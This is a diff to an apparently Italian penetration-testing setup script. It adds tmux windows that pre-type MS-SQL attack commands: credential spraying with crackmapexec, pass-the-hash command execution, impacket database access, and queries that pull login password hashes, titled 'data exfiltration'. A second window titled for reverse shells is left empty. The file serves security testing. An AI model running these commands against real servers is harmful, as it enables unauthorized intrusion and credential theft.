@@ -227,6 +227,16 @@ else
 	sudo apt install joomscan
 fi
 
+# juumscan (automatizzo l'analisi delle vulnerabilità di joomla)
+printf "\n===================================\n"
+program="rlwrap"
+if is_installed "$program"; then
+	echo "[i] $program is already installed."
+else
+	echo "[->] Installing $program..."	
+	sudo apt install rlwrap
+fi
+
 # droopescan (automatizzo l'analisi delle vulnerabilità di drupal)
 printf "\n===================================\n"
 program="droopescan"
@@ -2405,7 +2415,68 @@ tmux send-keys -t PT:25.2 "printf \"\n# GDB: Activate GDB\n# Use these command t
 tmux send-keys -t PT:25.2 "gdb binary.elf"
 cd $folderProject
 
+cd $folderProjectAuthN
+# GDB Server
+tmux new-window -t PT:26 -n '[1443] MS-SQL Server: verify credentials, access DB, extract usefull info'
+tmux split-window -v -t PT:26.0
+tmux resize-pane -t PT:26.0 -y 3
+tmux split-window -v -t PT:26.1
+tmux split-window -v -t PT:26.2
+tmux select-pane -t "26.2"
+tmux split-window -h -t "26.2"
+tmux split-window -v -t PT:26.4
+tmux select-pane -t "26.4"
+tmux split-window -h -t "26.4"
+tmux split-window -h -t "26.4"
+tmux split-window -h -t "26.4"
+tmux split-window -v -t PT:26.8
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:26.0 "# MS-SQL: Service fingerprint" Enter
+tmux send-keys -t PT:26.0 "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip"
+tmux send-keys -t PT:26.1 "# MS-SQL: verify credentials" Enter
+tmux send-keys -t PT:26.1 "crackmapexec mssql $ip -u users.txt -p passwords.txt --continue-on-success && echo "" &&  crackmapexec mssql $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && crackmapexec mssql $ip -u 'dontknow' -p '' --no-bruteforce --continue-on-success && echo "" && crackmapexec mssql $ip -u '' -p '' --no-bruteforce --continue-on-success"
+tmux send-keys -t PT:26.2 "# MS-SQL: execute command with Credentials" Enter
+tmux send-keys -t PT:26.2 "crackmapexec mssql $ip -d $domain -u USER -p PASS -x "whoami""
+tmux send-keys -t PT:26.3 "# MS-SQL: execute command with HASH" Enter
+tmux send-keys -t PT:26.3 "crackmapexec mssql $ip -d $domain -u USER -H HASH-NT -X '$PSVersionTable'"
+tmux send-keys -t PT:26.4 "# MS-SQL: Access to database with windows authN and domain" Enter
+tmux send-keys -t PT:26.4 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py '$domain/USER:PASS'@$ip -windows-auth"
+tmux send-keys -t PT:26.5 "# MS-SQL: Access to database with windows authN" Enter
+tmux send-keys -t PT:26.5 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip -windows-auth"
+tmux send-keys -t PT:26.6 "# MS-SQL: Access to database with SQL credentials" Enter
+tmux send-keys -t PT:26.6 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:26.7 "printf \"\n# MS-SQL: Access to database with SQL credentials \n# Note:\n# When using the sqsh command, the SQL commands must be executed by giving a GO command \n\" " Enter
+tmux send-keys -t PT:26.7 "sqsh -S $ip -U $domain\\USER -P PASS"
+tmux send-keys -t PT:26.8 "printf \"\n# # MS-SQL: data exfiltration\n# # Get version\n# SQL> select @@version;\n# Returns the current database user\n# SQL> select user_name();\n# Get users that can run xp_cmdshell\n# SQL> Use master\n# SQL> EXEC sp_helprotect 'xp_cmdshell'\n# Get databases\n# SQL> SELECT name FROM master.dbo.sysdatabases;\n#Get table names\n# SQL> USE master\n# SQL> SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;\n# Find List Linked Servers\n# SQL> EXEC sp_linkedservers\n# I search for all servers connected to the remote server. So this is a more generic query\n# SQL> SELECT * FROM sys.servers;\n# report about logins configured in the instance\n# SQL> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;\n\" " Enter
+tmux send-keys -t PT:26.8 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip -windows-auth"
+cd $folderProject
 
+cd $folderProjectAuthN
+# GDB Server
+tmux new-window -t PT:27 -n '[1443] MS-SQL: user sysadmin, read/write file, reverse shell, user HASH'
+tmux split-window -v -t PT:27.0
+tmux resize-pane -t PT:27.0 -y 3
+tmux select-pane -t "27.0"
+tmux split-window -h -t "27.0"
+tmux split-window -v -t PT:27.2
+tmux select-pane -t "27.2"
+tmux split-window -h -t "27.2"
+tmux split-window -h -t "27.2"
+tmux split-window -v -t PT:27.5
+tmux select-pane -t "27.5"
+tmux split-window -h -t "27.5"
+tmux split-window -v -t PT:27.7
+tmux select-pane -t "27.7"
+tmux split-window -h -t "27.7"
+tmux split-window -h -t "27.7"
+tmux split-window -v -t PT:27.10
+tmux select-pane -t "27.10"
+tmux split-window -h -t "27.10"
+tmux split-window -h -t "27.10"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:27.0 "# MS-SQL: " Enter
+tmux send-keys -t PT:27.0 ""
+cd $folderProject
 
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
